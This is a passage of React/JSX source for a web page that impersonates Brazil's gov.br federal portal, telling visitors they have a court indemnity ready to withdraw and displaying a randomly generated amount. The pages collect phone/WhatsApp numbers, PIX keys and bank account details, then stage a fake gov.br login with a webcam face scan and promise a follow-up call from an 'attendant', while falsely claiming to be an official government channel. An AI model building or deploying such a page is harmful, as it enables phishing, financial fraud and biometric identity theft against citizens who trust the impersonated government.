                      `R$ ${(Math.random() * 50000 + 10000).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`}
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-gov-blue-lighter border border-gov-blue p-6 rounded-lg mb-6">
          <div className="flex items-center mb-4">
            <Info className="h-5 w-5 text-gov-blue mr-3" />
            <h3 className="text-lg font-semibold text-gov-blue">Informações Importantes</h3>
          </div>
          <ul className="space-y-2 text-gov-gray">
            <li className="flex items-center">
              <CheckCircle className="h-4 w-4 text-gov-green mr-2" />
              <span>Processo com decisão favorável confirmada</span>
            </li>
            <li className="flex items-center">
              <CheckCircle className="h-4 w-4 text-gov-green mr-2" />
              <span>Valor da indenização disponível para saque</span>
            </li>
            <li className="flex items-center">
              <CheckCircle className="h-4 w-4 text-gov-green mr-2" />
              <span>Documentação validada pelos órgãos competentes</span>
            </li>
          </ul>
        </div>

        <Button onClick={goToBancario} className="btn-gov w-full text-lg py-4">
          <CreditCard className="h-5 w-5 mr-2" />
          Preencher Dados para Recebimento
        </Button>
      </div>
    </main>
  )

  const renderBancarioPage = () => (
    <main className="container mx-auto px-4 py-8 max-w-3xl">
      <div className="card-gov">
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-gov-blue-light rounded-full flex items-center justify-center mx-auto mb-4">
            <CreditCard className="h-8 w-8 text-gov-blue" />
          </div>
          <h2 className="text-2xl font-bold text-gov-blue mb-2">Dados para Recebimento</h2>
          <p className="text-gov-gray">Informe seus dados de contato e preferência de recebimento da indenização</p>
        </div>

        <div className="space-y-8">
          {/* Dados de Contato */}
          <div className="bg-gov-blue-lighter border border-gov-blue p-6 rounded-lg">
            <h3 className="text-lg font-semibold text-gov-blue mb-4 flex items-center">
              <Phone className="h-5 w-5 mr-2" />
              Dados de Contato
            </h3>
            <div>
              <label className="block text-sm font-semibold text-gov-gray mb-2">Telefone/WhatsApp</label>
              <Input
                type="tel"
                placeholder="(11) 99999-9999"
                value={telefone}
                onChange={(e) => setTelefone(formatarTelefone(e.target.value))}
                className="input-gov w-full"
                maxLength={15}
              />
              <p className="text-xs text-gov-gray mt-1">Será usado para confirmação e atualizações sobre o processo</p>
            </div>
          </div>

          {/* Dados PIX */}
          <div className="bg-green-50 border border-green-200 p-6 rounded-lg">
            <h3 className="text-lg font-semibold text-gov-blue mb-4 flex items-center">
              <CreditCard className="h-5 w-5 mr-2" />
              Dados PIX (Recomendado)
            </h3>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-semibold text-gov-gray mb-2">Tipo de Chave PIX</label>
                <Select value={tipoChavePix} onValueChange={setTipoChavePix}>
                  <SelectTrigger className="select-gov w-full">
                    <SelectValue placeholder="Selecione o tipo de chave" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="cpf">CPF</SelectItem>
                    <SelectItem value="email">E-mail</SelectItem>
                    <SelectItem value="telefone">Telefone</SelectItem>
                    <SelectItem value="aleatoria">Chave Aleatória</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div>
                <label className="block text-sm font-semibold text-gov-gray mb-2">Chave PIX</label>
                <Input
                  type="text"
                  placeholder="Digite sua chave PIX"
                  value={chavePix}
                  onChange={(e) => setChavePix(e.target.value)}
                  className="input-gov w-full"
                />
                <p className="text-xs text-gov-gray mt-1">
                  {tipoChavePix === "cpf" && "Digite seu CPF (mesmo da consulta)"}
                  {tipoChavePix === "email" && "Digite seu e-mail cadastrado no PIX"}
                  {tipoChavePix === "telefone" && "Digite seu telefone cadastrado no PIX"}
                  {tipoChavePix === "aleatoria" && "Cole sua chave PIX aleatória"}
                  {!tipoChavePix && "Selecione o tipo de chave acima"}
                </p>
              </div>
            </div>
            <div className="mt-4 p-3 bg-green-100 rounded-lg">
              <div className="flex items-center text-sm text-green-800">
                <Clock className="h-4 w-4 text-green-600 mr-2" />
                <span>
                  <strong>PIX:</strong> Recebimento instantâneo, disponível 24h por dia
                </span>
              </div>
            </div>
          </div>

          {/* Dados Bancários Tradicionais */}
          <div className="bg-gray-50 border border-gray-200 p-6 rounded-lg">
            <h3 className="text-lg font-semibold text-gov-blue mb-4 flex items-center">
              <CreditCard className="h-5 w-5 mr-2" />
              Dados Bancários Tradicionais (Opcional)
            </h3>
            <div className="space-y-4">
              <div className="relative">
                <label className="block text-sm font-semibold text-gov-gray mb-2">Banco</label>
                <Input
                  type="text"
                  placeholder="Ex: Banco do Brasil, Caixa Econômica Federal, Itaú..."
                  value={banco}
                  onChange={(e) => {
                    setBanco(e.target.value)
                    filtrarBancos(e.target.value)
                  }}
                  onBlur={() => {
                    setTimeout(() => {
                      setMostrarSugestoes(false)
                    }, 200)
                  }}
                  className="input-gov w-full"
                />

                {mostrarSugestoes && bancosFiltrados.length > 0 && (
                  <div className="absolute z-10 w-full mt-1 bg-white border border-gray-300 rounded-md shadow-lg max-h-48 overflow-y-auto">
                    {bancosFiltrados.map((bancoItem, index) => (
                      <div
                        key={index}
                        className="px-4 py-2 hover:bg-blue-50 cursor-pointer text-sm border-b last:border-b-0"
                        onClick={() => selecionarBanco(bancoItem)}
                      >
                        {bancoItem}
                      </div>
                    ))}
                  </div>
                )}
              </div>

              <div>
                <label className="block text-sm font-semibold text-gov-gray mb-2">Agência</label>
                <Input
                  type="text"
                  placeholder="0000"
                  value={agencia}
                  onChange={(e) => setAgencia(e.target.value)}
                  className="input-gov w-full"
                  maxLength={6}
                />
              </div>
              <div>
                <label className="block text-sm font-semibold text-gov-gray mb-2">Conta</label>
                <Input
                  type="text"
                  placeholder="00000-0"
                  value={conta}
                  onChange={(e) => setConta(e.target.value)}
                  className="input-gov w-full"
                  maxLength={12}
                />
              </div>
            </div>
            <div className="mt-4 p-3 bg-gray-100 rounded-lg">
              <div className="flex items-center text-sm text-gray-600">
                <Clock className="h-4 w-4 text-gray-500 mr-2" />
                <span>
                  <strong>TED/DOC:</strong> Recebimento em 1-2 dias úteis
                </span>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-gov-blue-lighter border border-gov-blue p-4 rounded-lg mt-6">
          <div className="flex items-start">
            <Shield className="h-5 w-5 text-gov-blue mr-3 mt-1" />
            <div className="text-sm text-gov-gray">
              <p className="font-semibold text-gov-blue mb-1">Segurança dos Dados</p>
              <p>
                Seus dados são protegidos por criptografia de nível bancário e não são armazenados em nossos servidores
                após o processamento.
              </p>
            </div>
          </div>
        </div>

        <Button onClick={goToGovLogin} className="btn-gov w-full text-lg py-4 mt-8">
          <CreditCard className="h-5 w-5 mr-2" />
          Prosseguir com Verificação de Identidade
        </Button>
      </div>
    </main>
  )

  const renderGovbrLoginPage = () => (
    <main className="container mx-auto px-4 py-8 max-w-2xl">
      <div className="card-gov">
        <div className="flex items-center mb-8">
          <div className="w-12 h-12 bg-gov-blue rounded text-white flex items-center justify-center mr-4 font-bold text-lg">
            gov.br
          </div>
          <div>
            <h2 className="text-xl font-bold text-gov-blue">Verificação de Identidade</h2>
            <p className="text-gov-gray">Identifique-se no gov.br para continuar</p>
          </div>
        </div>

        <div className="bg-gov-gray border border-gray-300 rounded-lg p-4 mb-6">
          <label className="block text-sm font-semibold text-gov-gray mb-2">Número do CPF</label>
          <p className="text-gov-gray mb-2">
            Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
          </p>
          <Input type="text" value={cpf} className="input-gov w-full font-mono text-lg" readOnly />
        </div>

        <Button className="btn-gov w-full mb-8 bg-gov-blue hover:bg-gov-blue-dark">Continuar</Button>

        <div className="border-t border-gray-200 pt-6">
          <h3 className="text-lg font-semibold text-gov-gray mb-4">Outras opções de identificação:</h3>
          <div className="space-y-3">
            <div className="flex items-center p-4 border border-gray-200 rounded-lg opacity-50">
              <CreditCard className="h-5 w-5 text-gov-gray mr-4" />
              <span className="text-gov-gray">Login com seu banco</span>
              <span className="ml-auto text-xs bg-gray-200 text-gray-600 px-2 py-1 rounded">Indisponível</span>
            </div>

            <div className="flex items-center p-4 border border-gray-200 rounded-lg opacity-50">
              <QrCode className="h-5 w-5 text-gov-gray mr-4" />
              <span className="text-gov-gray">Login com QR code</span>
              <span className="ml-auto text-xs bg-gray-200 text-gray-600 px-2 py-1 rounded">Indisponível</span>
            </div>

            <Button
              onClick={goToFacialScan}
              className="w-full flex items-center p-4 border-2 border-gov-blue rounded-lg bg-gov-blue-lighter hover:bg-gov-blue-light transition-colors"
            >
              <CreditCard className="h-5 w-5 text-gov-blue mr-4" />
              <div className="text-left flex-1">
                <span className="font-semibold text-gov-blue block">Reconhecimento Facial</span>
                <span className="text-sm text-gov-gray">Verificação biométrica segura</span>
              </div>
              <span className="text-xs bg-gov-green text-white px-2 py-1 rounded">Disponível</span>
            </Button>

            <div className="flex items-center p-4 border border-gray-200 rounded-lg opacity-50">
              <Shield className="h-5 w-5 text-gov-gray mr-4" />
              <span className="text-gov-gray">Seu certificado digital</span>
              <span className="ml-auto text-xs bg-gray-200 text-gray-600 px-2 py-1 rounded">Indisponível</span>
            </div>

            <div className="flex items-center p-4 border border-gray-200 rounded-lg opacity-50">
              <Cloud className="h-5 w-5 text-gov-gray mr-4" />
              <span className="text-gov-gray">Seu certificado digital em nuvem</span>
              <span className="ml-auto text-xs bg-gray-200 text-gray-600 px-2 py-1 rounded">Indisponível</span>
            </div>
          </div>

          <div className="mt-6 text-center">
            <button className="text-gov-blue hover:underline text-sm flex items-center justify-center mx-auto">
              <HelpCircle className="h-4 w-4 mr-1" />
              Está com dúvidas e precisa de ajuda?
            </button>
          </div>
        </div>
      </div>
    </main>
  )

  const renderFacialScanPage = () => (
    <main className="container mx-auto px-4 py-8 max-w-2xl">
      <div className="card-gov text-center">
        <div className="mb-6">
          <div className="w-16 h-16 bg-gov-blue-light rounded-full flex items-center justify-center mx-auto mb-4">
            <CreditCard className="h-8 w-8 text-gov-blue" />
          </div>
          <h2 className="text-2xl font-bold text-gov-blue mb-2">Reconhecimento Facial</h2>
          <p className="text-gov-gray">Posicione seu rosto na área indicada para verificação</p>
        </div>

        <div className="relative w-full max-w-md mx-auto h-80 bg-gray-900 rounded-lg overflow-hidden mb-6">
          <video ref={videoRef} className="w-full h-full object-cover transform scale-x-[-1]" autoPlay playsInline />
          <div className="absolute inset-0 flex items-center justify-center">
            <div className="w-3/4 h-3/4 border-4 border-gov-blue rounded-full opacity-75 animate-pulse"></div>
          </div>
          <div className="absolute bottom-4 left-4 right-4">
            <div className="bg-black bg-opacity-50 text-white text-sm p-2 rounded">
              <Info className="h-4 w-4 inline mr-2" />
              Escaneamento em andamento...
            </div>
          </div>
        </div>

        <div className="space-y-3 text-sm text-gov-gray">
          <div className="flex items-center justify-center">
            <CheckCircle className="h-4 w-4 text-gov-green mr-2" />
            <span>Mantenha seu rosto centralizado na tela</span>
          </div>
          <div className="flex items-center justify-center">
            <CheckCircle className="h-4 w-4 text-gov-green mr-2" />
            <span>Certifique-se de que há boa iluminação</span>
          </div>
          <div className="flex items-center justify-center">
            <CheckCircle className="h-4 w-4 text-gov-green mr-2" />
            <span>Remova óculos escuros ou acessórios</span>
          </div>
        </div>

        <div className="mt-6 p-4 bg-gov-blue-lighter border border-gov-blue rounded-lg">
          <div className="flex items-center text-sm text-gov-gray">
            <Shield className="h-5 w-5 text-gov-blue mr-3" />
            <span>Seus dados biométricos são processados localmente e não são armazenados</span>
          </div>
        </div>
      </div>
    </main>
  )

  const renderFacialIdentifiedPage = () => (
    <main className="container mx-auto px-4 py-8 max-w-2xl flex items-center justify-center min-h-[60vh]">
      <div className="card-gov text-center">
        <div className="w-20 h-20 bg-gov-green rounded-full flex items-center justify-center mx-auto mb-6">
          <Check className="h-10 w-10 text-white" />
        </div>
        <h2 className="text-3xl font-bold text-gov-blue mb-2">Usuário Identificado!</h2>
        <p className="text-lg text-gov-gray mb-8">Seu reconhecimento facial foi concluído com sucesso</p>

        <div className="bg-gov-green bg-opacity-10 border border-gov-green rounded-lg p-6 mb-6">
          <div className="flex items-center justify-center mb-4">
            <Shield className="h-8 w-8 text-gov-green mr-3" />
            <span className="font-semibold text-gov-green">Identidade Verificada</span>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-sm">
            <div className="flex items-center justify-center">
              <CheckCircle className="h-4 w-4 text-gov-green mr-2" />
              <span>Biometria Validada</span>
            </div>
            <div className="flex items-center justify-center">
              <CheckCircle className="h-4 w-4 text-gov-green mr-2" />
              <span>CPF Confirmado</span>
            </div>
            <div className="flex items-center justify-center">
              <CheckCircle className="h-4 w-4 text-gov-green mr-2" />
              <span>Acesso Autorizado</span>
            </div>
          </div>
        </div>

        <div className="loading-spinner mx-auto mb-4"></div>
        <p className="text-gov-gray">Processando solicitação de saque...</p>
      </div>
    </main>
  )

  const renderSuccessPage = () => (
    <main className="container mx-auto px-4 py-8 max-w-2xl flex items-center justify-center min-h-[60vh]">
      <div className="card-gov text-center">
        <div className="mb-6">
          <div className="w-20 h-20 bg-gov-green rounded-full flex items-center justify-center mx-auto mb-4">
            <Check className="h-10 w-10 text-white" />
          </div>
          <h2 className="text-3xl font-bold text-gov-blue mb-2">Solicitação Aprovada!</h2>
          <p className="text-lg text-gov-gray">Sua solicitação de saque foi processada com sucesso.</p>
        </div>

        <div className="bg-gov-green bg-opacity-10 border border-gov-green rounded-lg p-6 mb-8">
          <h3 className="font-semibold text-gov-green mb-4">Próximos Passos:</h3>
          <div className="space-y-3 text-left">
            <div className="flex items-start">
              <div className="w-6 h-6 bg-gov-green rounded-full flex items-center justify-center mr-3 mt-0.5">
                <span className="text-white text-xs font-bold">1</span>
              </div>
              <div>
                <p className="font-semibold text-gov-blue">Aguardando Contato</p>
                <p className="text-sm text-gov-gray">
                  Um de nossos atendentes entrará em contato com você, através do número informado, em alguns instantes.
                </p>
              </div>
            </div>
            <div className="flex items-start">
              <div className="w-6 h-6 bg-gov-green rounded-full flex items-center justify-center mr-3 mt-0.5">
                <span className="text-white text-xs font-bold">2</span>
              </div>
              <div>
                <p className="font-semibold text-gov-blue">Confirmação Final</p>
                <p className="text-sm text-gov-gray">
                  Confirme seus dados de recebimento com o atendente especializado.
                </p>
              </div>
            </div>
            <div className="flex items-start">
              <div className="w-6 h-6 bg-gov-green rounded-full flex items-center justify-center mr-3 mt-0.5">
                <span className="text-white text-xs font-bold">3</span>
              </div>
              <div>
                <p className="font-semibold text-gov-blue">Recebimento</p>
                <p className="text-sm text-gov-gray">O valor será transferido conforme o método escolhido.</p>
              </div>
            </div>
          </div>
        </div>

        <div className="mt-6 p-4 bg-gov-blue-lighter border border-gov-blue rounded-lg">
          <div className="flex items-center text-sm text-gov-gray">
            <CreditCard className="h-4 w-4 text-gov-blue mr-2" />
            <span>Este é um canal oficial do Governo Federal. Seus dados estão protegidos.</span>
          </div>
        </div>
      </div>
    </main>
  )

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-blue-600 text-white">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center space-x-4">
              <div className="text-xl font-bold">gov.br</div>
              <div className="hidden md:block text-sm">
                Portal do Governo Federal
                <div className="text-xs opacity-90">Transparência e Eficiência</div>
              </div>
            </div>
            <div className="flex items-center space-x-4">
              <Button variant="ghost" size="sm" className="text-white hover:bg-white/10 transition-colors">
                <CreditCard className="h-4 w-4" />
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:bg-white/10 transition-colors">
                <CreditCard className="h-4 w-4" />
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:bg-white/10 md:hidden transition-colors">
                <CreditCard className="h-4 w-4" />
              </Button>
            </div>
          </div>
        </div>
      </header>

      <div className="bg-white border-b border-gray-200">
        <div className="container mx-auto px-4 py-3">
          <div className="text-sm text-blue-600 font-medium">Início &gt; Serviços &gt; Consulta Processual</div>
        </div>
      </div>

      {renderCurrentPage()}

      {/* Footer */}
      <footer className="bg-blue-600 text-white">
        <div className="container mx-auto px-4 py-12">
          <div className="grid md:grid-cols-4 gap-8">
            <div>
              <h3 className="font-semibold mb-4 text-lg">Para Cidadãos</h3>
              <ul className="space-y-3 text-sm">
                <li>
                  <a href="#" className="hover:text-white/80 transition-colors">
                    Consulta Processual
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white/80 transition-colors">
                    Serviços Digitais
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white/80 transition-colors">
                    Atendimento
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="font-semibold mb-4 text-lg">Para Profissionais</h3>
              <ul className="space-y-3 text-sm">
                <li>
                  <a href="#" className="hover:text-white/80 transition-colors">
                    Jurisprudência
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white/80 transition-colors">
                    Legislação
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white/80 transition-colors">
                    Modelos
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="font-semibold mb-4 text-lg">Institucional</h3>
              <ul className="space-y-3 text-sm">
                <li>
                  <a href="#" className="hover:text-white/80 transition-colors">
                    Sobre o Portal
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white/80 transition-colors">
                    Transparência
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white/80 transition-colors">
                    Ouvidoria
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="font-semibold mb-4 text-lg">Ajuda</h3>
              <ul className="space-y-3 text-sm">
                <li>
                  <a href="#" className="hover:text-white/80 transition-colors">
                    Central de Ajuda
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white/80 transition-colors">
                    Termos de Uso
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-white/80 transition-colors">
                    Privacidade
                  </a>
                </li>
              </ul>
            </div>
          </div>

          <div className="border-t border-blue-500 mt-8 pt-8 text-center text-sm">
            <p>© 2025 Governo Federal. Todos os direitos reservados.</p>
            <p className="mt-2">Portal desenvolvido seguindo o Padrão Digital de Governo</p>
          </div>
        </div>
      </footer>
    </div>
  )
}
